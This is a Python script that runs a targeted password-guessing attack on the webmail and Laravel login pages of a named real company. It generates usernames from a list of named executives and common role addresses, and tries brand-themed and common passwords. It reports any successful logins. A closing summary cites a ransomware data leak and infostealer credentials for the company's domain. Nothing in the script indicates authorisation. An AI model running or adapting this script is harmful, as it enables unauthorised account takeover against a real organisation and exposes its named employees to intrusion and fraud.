import requests, urllib3, re, dns.resolver, socket, ssl
urllib3.disable_warnings()

# Resolve webmail via Google DNS
resolver = dns.resolver.Resolver()
resolver.nameservers = ['8.8.8.8']
ip = str(resolver.resolve('webmail.parleagro.com', 'A')[0])
print(f"webmail.parleagro.com -> {ip}")

# Custom transport that preserves SNI
class SNIAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, server_hostname, *args, **kwargs):
        self.server_hostname = server_hostname
        super().__init__(*args, **kwargs)
    def send(self, request, **kwargs):
        request.url = request.url.replace(f"://{self.server_hostname}", f"://{ip}", 1)
        return super().send(request, **kwargs)

s = requests.Session()
s.mount("https://", SNIAdapter("webmail.parleagro.com"))
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Host": "webmail.parleagro.com"})

# Generate email patterns based on known exec names
# From LeadNear: Rb Jain, Devdan Jaru, Anjali Thakur, Shashank Aundhekar, etc.
# Pattern: first letter of first name + last name@parleagro.com
exec_names = [
    ("Rb", "Jain"), ("Devdan", "Jaru"), ("Anjali", "Thakur"),
    ("Shashank", "Aundhekar"), ("Yanamala", "Reddy"), ("Jambunathan", "Venkatr"),
    ("Sanjay", "Grover"), ("Vivek", "Subramaniam"), ("Somesh", "Rathi"),
    ("Praveen", "Sudhakaran"), ("Schmetterling", "Mesquita"),
]

# Generate potential usernames (email local parts)
usernames = []
for first, last in exec_names:
    # Pattern: first initial + lastname (e.g., rjain)
    usernames.append((first[0].lower() + last.lower(), last.lower()))
    # Pattern: firstname.lastname
    usernames.append((first.lower() + "." + last.lower(), last.lower()))
    # Pattern: full firstname.lastname as email
    usernames.append((f"{first.lower()}.{last.lower()}", last.lower()))

# Add common role-based emails
role_emails = [
    "info", "support", "admin", "hr", "accounts", "sales", "marketing",
    "it", "helpdesk", "webmail", "administrator", "test", "user",
    "consumercare", "career", "job", "pr", "media", "finance",
    "ceo", "md", "director", "manager", "operations", "logistics",
]
for role in role_emails:
    usernames.append((role, role))

# Password candidates - based on breach analysis
passwords = [
    "admin", "admin123", "Password@123", "password", "Passw0rd",
    "Parle@123", "parleagro", "Parleagro", "PARLEAGRO",
    "Parle@2024", "Parle@2025", "Parle@2026",
    "Frooti", "frooti", "Appy", "appy", "Bailley", "bailley",
    "Hippo", "hippo", "LMN", "lmn",
    "Welcome@1", "welcome", "Welcome1",
    "P@ssw0rd", "P@$$w0rd", "Pass@123",
    "changeme", "ChangeMe", "Change@123",
    "test@123", "Test@123", "test123",
    "123456", "12345678", "123456789",
    "Company@123", "company",
    "India@123", "india", "Mumbai@123", "mumbai",
    "info@123", "Info@123",
]

# Fetch login page
r = s.get("https://webmail.parleagro.com/index.php", timeout=15, verify=False)
print(f"Login page: {r.status_code}")

if r.status_code == 200:
    # Extract session fields
    html = r.text
    sk = re.search(r'name=[\"\x27]sessionkey[\"\x27][^>]*value=[\"\x27]([^\"\x27]+)[\"\x27]', html)
    sv = re.search(r'name=[\"\x27]session[\"\x27][^>]*value=[\"\x27]([^\"\x27]+)[\"\x27]', html)
    
    if sk and sv:
        print(f"sessionkey: {sk.group(1)[:20]}...")
        print(f"session: {sv.group(1)[:20]}...")
        
        # Try limited brute-force with email usernames
        print("\n=== TARGETED BRUTE-FORCE ===")
        found = False
        for (email_try, pw) in [(u, p) for (u, _) in usernames[:20] for p in passwords[:5]]:
            if found:
                break
            data = {
                "username": email_try + "@parleagro.com",
                "password": pw,
                "ecode": "0000",
                "sessionkey": sk.group(1),
                "session": sv.group(1)
            }
            try:
                r2 = s.post("https://webmail.parleagro.com/index.php", data=data, timeout=10, verify=False, allow_redirects=False)
                if r2.status_code == 302:
                    print(f"*** SUCCESS: {email_try}@parleagro.com : {pw} ***")
                    found = True
                    break
                elif r2.status_code != 403:
                    loc = r2.headers.get("Location", "")
                    print(f"  DIFF: {email_try}@parleagro.com:{pw} -> {r2.status_code} {loc[:50]}")
            except:
                pass
        
        if not found:
            print("No success with targeted credentials")
else:
    print(f"Failed to get login page, status: {r.status_code}")

# Also try www.parleagro.com Laravel login
print("\n=== LARAVEL LOGIN ===")
try:
    s2 = requests.Session()
    r = s2.get("https://www.parleagro.com/login", timeout=10, verify=False)
    csrf = re.search(r'name=["\x27]_token["\x27].*?value=["\x27]([^"\x27]+)["\x27]', r.text)
    if csrf:
        print(f"CSRF token found: {csrf.group(1)[:20]}...")
        # Try some default creds
        for email, pw in [("admin@parleagro.com","password"), ("admin@parleagro.com","admin123"), ("test@parleagro.com","test123")]:
            data = {
                "_token": csrf.group(1),
                "email": email,
                "password": pw,
            }
            r2 = s2.post("https://www.parleagro.com/login", data=data, timeout=10, verify=False, allow_redirects=False)
            if r2.status_code == 302:
                print(f"*** LARAVEL SUCCESS: {email}:{pw} -> {r2.headers.get('Location','')} ***")
            elif r2.status_code != 200 or "These credentials" not in r2.text:
                print(f"  LARAVEL DIFF: {email}:{pw} -> {r2.status_code} ({len(r2.content)}B)")
        print("Laravel login test complete")
except Exception as e:
    print(f"Laravel error: {type(e).__name__}")

print("\n=== DORKING SUMMARY ===")
print("1. Lamashtu Ransomware: 30GB leaked (May 2026) - SAP, HR, legal docs")
print("2. HudsonRock: 83 infostealer credentials for parleagro.com")
print("3. Employee emails: first_letter_lastname@parleagro.com pattern")
print("4. DNS: ns1.netmagicians.com, ns2.netmagicians.com (Netmagicians hosting)")
print("5. Git repos searched - no direct parleagro code leaks found")
print("6. Pastebin searched - no direct parleagro leaks found")
print("7. Google dorking - no exposed .env or config found")
